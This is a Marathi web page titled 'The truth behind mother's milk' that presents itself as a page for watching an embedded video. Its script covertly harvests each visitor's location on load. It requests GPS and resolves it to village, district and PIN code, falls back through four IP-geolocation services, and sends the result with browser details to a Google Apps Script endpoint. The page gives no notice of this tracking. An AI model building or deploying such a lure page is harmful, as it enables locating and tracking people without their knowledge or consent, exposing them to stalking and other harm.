<!DOCTYPE html>
<html lang="mr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>आईच्या दुधामागचं सत्य</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #ffffff;
            padding: 24px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        h1 { color: #d32f2f; font-size: 26px; margin-bottom: 8px; }
        p.subtext { font-size: 16px; margin-bottom: 20px; color: #555; font-weight: 500; }
        .video-container {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            border-radius: 8px;
            background: #000;
        }
        .video-container iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: 0;
        }
        .status { margin-top: 15px; font-size: 13px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h1>आईच्या दुधामागचं सत्य</h1>
    <p class="subtext">कृपया हा व्हिडिओ पूर्ण पाहा.</p>
    <div class="video-container">
        <iframe src="https://www.youtube.com/embed/XhTOLeevtQw"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen></iframe>
    </div>
    <p class="status" id="statusMessage"></p>
</div>

<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbySiXzyeRDgTlGZRbqn5eTnzHrFdFzqrKRVmsnF6g8fNiy3eNNWtgKozCTRTfSg5qj7/exec";
const MAX_VISITS = 3;

// ── GUARD 1: Refresh guard (sessionStorage clears on tab close, persists on F5)
if (sessionStorage.getItem("tracked")) {
    console.log("Refresh detected – skipping.");
    // stop here, don't run anything below
} else {
    sessionStorage.setItem("tracked", "true");

    // ── GUARD 2: Visit count guard (localStorage persists across sessions)
    let visitCount = parseInt(localStorage.getItem("vc") || "0");
    if (visitCount >= MAX_VISITS) {
        console.log("Visit limit reached – skipping.");
    } else {
        localStorage.setItem("vc", visitCount + 1);
        window.onload = collectAndSendData; // only register if guards pass
    }
}

// ── LOCATION: Try GPS → precise town name via Nominatim, else IP fallback
async function getPreciseLocation() {

    // 1️⃣ GPS (asks permission, gives Alandi-level accuracy)
    try {
        const pos = await new Promise((resolve, reject) =>
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 6000 })
        );
        const { latitude, longitude } = pos.coords;
        const res = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`,
            { headers: { "Accept-Language": "en" } }
        );
        const geo = await res.json();
        const a = geo.address;
        // Build from most-specific to least: village → suburb → town → city
        const locality =
            a.village || a.suburb || a.town || a.city_district || a.city || a.county || "";
        const district = a.county || a.state_district || "";
        const state    = a.state || "";
        const pin      = a.postcode || "";
        return `${locality}, ${district}, ${state} - ${pin} [GPS]`;
    } catch (gpsErr) {
        console.warn("GPS unavailable, switching to IP geolocation.");
    }

    // 2️⃣ IP Geolocation – chain of 4 providers with auto-fallback
    const ipProviders = [

        // Provider A: ipwho.is
        async () => {
            const r = await fetch("https://ipwho.is/");
            const d = await r.json();
            if (!d.success) throw new Error("ipwho.is failed");
            const city = d.city || "";
            const region = d.region || "";
            const pin  = d.postal || "";
            const isp  = d.connection?.isp || "";
            return `${city}, ${region} ${pin} - ${isp}`;
        },

        // Provider B: ip-api.com (has 'district' field — more granular)
        async () => {
            const r = await fetch("https://ip-api.com/json/?fields=status,message,city,district,regionName,zip,isp");
            const d = await r.json();
            if (d.status !== "success") throw new Error("ip-api.com failed");
            const locality = d.district || d.city || "";
            return `${locality}, ${d.regionName} ${d.zip || ""} - ${d.isp || ""}`;
        },

        // Provider C: ipinfo.io (50k free/month)
        async () => {
            const r = await fetch("https://ipinfo.io/json");
            const d = await r.json();
            if (!d.city) throw new Error("ipinfo.io failed");
            return `${d.city}, ${d.region} ${d.postal || ""} - ${d.org || ""}`;
        },

        // Provider D: freeipapi.com (last resort)
        async () => {
            const r = await fetch("https://freeipapi.com/api/json");
            const d = await r.json();
            if (!d.cityName) throw new Error("freeipapi failed");
            return `${d.cityName}, ${d.regionName} ${d.zipCode || ""} - ${d.ipVersion || ""}`;
        }
    ];

    for (const provider of ipProviders) {
        try {
            return await provider();
        } catch (e) {
            console.warn("Provider failed, trying next...", e.message);
        }
    }

    return "Location unavailable";
}

async function collectAndSendData() {
    const locationString = await getPreciseLocation();

    const trackingData = {
        timestamp: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }),
        userAgent: navigator.userAgent,
        platform: navigator.platform || navigator.userAgentData?.platform || "Unknown",
        referrer: document.referrer || "Direct/QR Scan",
        location: locationString
    };

    try {
        await fetch(SCRIPT_URL, {
            method: "POST",
            body: JSON.stringify(trackingData),
            headers: { "Content-Type": "text/plain;charset=utf-8" }
        });
    } catch (err) {
        console.error("Tracking failed:", err);
    }
}
</script>

</body>
</html>
